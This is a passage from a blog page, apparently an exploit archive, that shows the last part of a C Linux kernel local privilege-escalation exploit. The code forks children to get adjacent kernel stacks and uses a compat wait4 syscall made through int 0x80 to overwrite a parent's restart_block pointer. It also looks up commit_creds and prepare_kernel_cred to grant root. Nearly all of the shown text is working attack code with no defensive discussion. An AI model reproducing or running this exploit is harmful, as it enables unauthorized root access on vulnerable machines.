  pid </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">fork</span><span style="color:#89ddff;">();</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">pid </span><span style="color:#89ddff;">== </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] helper going to sleep...</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">sleep</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">5</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] helper woke up</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] lower child calling compat_sys_wait4 on helper...</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* syscall(NR_WAIT4, pid, 0, 0, 0) */</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">asm </span><span style="color:#c792ea;">volatile </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">push </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rax</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">push </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rbx</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">push </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rcx</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">push </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rdx</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">push </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rsi</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">movl %0, </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">eax</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">movl %1, </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">ebx</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">movl %2, </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">ecx</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">movl %3, </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">edx</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">movl %4, </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">esi</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">int $0x80</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">pop </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rsi</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">pop </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rdx</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">pop </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rcx</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">pop </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rbx</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">pop </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rax</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">:</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">r</span><span style="color:#89ddff;">&quot;(</span><span style="color:#eeffff;">NR_WAIT4</span><span style="color:#89ddff;">), &quot;</span><span style="color:#c3e88d;">r</span><span style="color:#89ddff;">&quot;(</span><span style="color:#eeffff;">pid</span><span style="color:#89ddff;">), &quot;</span><span style="color:#c3e88d;">r</span><span style="color:#89ddff;">&quot;(</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">), &quot;</span><span style="color:#c3e88d;">r</span><span style="color:#89ddff;">&quot;(</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">), &quot;</span><span style="color:#c3e88d;">r</span><span style="color:#89ddff;">&quot;(</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">memory</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#c3e88d;">rax</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#c3e88d;">rbx</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#c3e88d;">rcx</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#c3e88d;">rdx</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#c3e88d;">rsi</span><span style="color:#89ddff;">&quot;</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] lower child returned from compat_sys_wait4</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] parent&#39;s restart_block has been clobbered</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* signal parent that our fptr should now be clobbered */</span><span style="color:#eeffff;">
  region</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">parent </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> KSTACK_CLOBBER</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;">
</span><span style="color:#82aaff;">main</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#f78c6c;">argc</span><span style="color:#89ddff;">, </span><span style="font-style:italic;color:#c792ea;">char </span><span style="color:#89ddff;">**</span><span style="color:#f78c6c;">argv</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> type</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(sizeof(</span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#89ddff;">) != </span><span style="color:#f78c6c;">8</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] x86_64 only, sorry!</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] looking for symbols...</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
  </span><span style="color:#eeffff;">
  commit_creds </span><span style="color:#89ddff;">= (</span><span style="color:#eeffff;">_commit_creds</span><span style="color:#89ddff;">) </span><span style="color:#82aaff;">get_symbol</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">commit_creds</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(!</span><span style="color:#eeffff;">commit_creds</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] symbol table not available, aborting!</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="color:#eeffff;">
  prepare_kernel_cred </span><span style="color:#89ddff;">= (</span><span style="color:#eeffff;">_prepare_kernel_cred</span><span style="color:#89ddff;">) </span><span style="color:#82aaff;">get_symbol</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">prepare_kernel_cred</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(!</span><span style="color:#eeffff;">prepare_kernel_cred</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] symbol table not available, aborting!</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  ia32_sysret </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">get_symbol</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">ia32_sysret</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(!</span><span style="color:#eeffff;">ia32_sysret</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] symbol table not available, aborting!</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] spawning children to achieve adjacent kstacks...</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  type </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">get_adjacent_kstacks</span><span style="color:#89ddff;">();</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">type </span><span style="color:#89ddff;">==</span><span style="color:#eeffff;"> KSTACK_PARENT</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">do_parent</span><span style="color:#89ddff;">();</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">} </span><span style="font-style:italic;color:#c792ea;">else if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">type </span><span style="color:#89ddff;">==</span><span style="color:#eeffff;"> KSTACK_UPPER</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">do_child_upper</span><span style="color:#89ddff;">();</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">} </span><span style="font-style:italic;color:#c792ea;">else if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">type </span><span style="color:#89ddff;">==</span><span style="color:#eeffff;"> KSTACK_LOWER</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">do_child_lower</span><span style="color:#89ddff;">();</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span></code></pre></div>


  <div class="post-footer">

  
    <div class="post-tags">
    
      <!-- <a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all&#x2F;">#all</a> -->
    
    </div>
  
  
    <div class="post-nav">
    
      <a class="previous" href="https:&#x2F;&#x2F;xjump.me&#x2F;20130106-local-exploit-cve2012-0056&#x2F;">‹ CVE-2012-0056</a>
    
    
      <a class="next" href="https:&#x2F;&#x2F;xjump.me&#x2F;20130107-tcp-32764-backdoor&#x2F;">TCP-32764 backdoor ›</a>
    
    
    
    </div>
  

  </div>


</article>

      </div>
    </main>



  </div>


<script type="text/javascript" src="/even.js"></script>

</body></html>
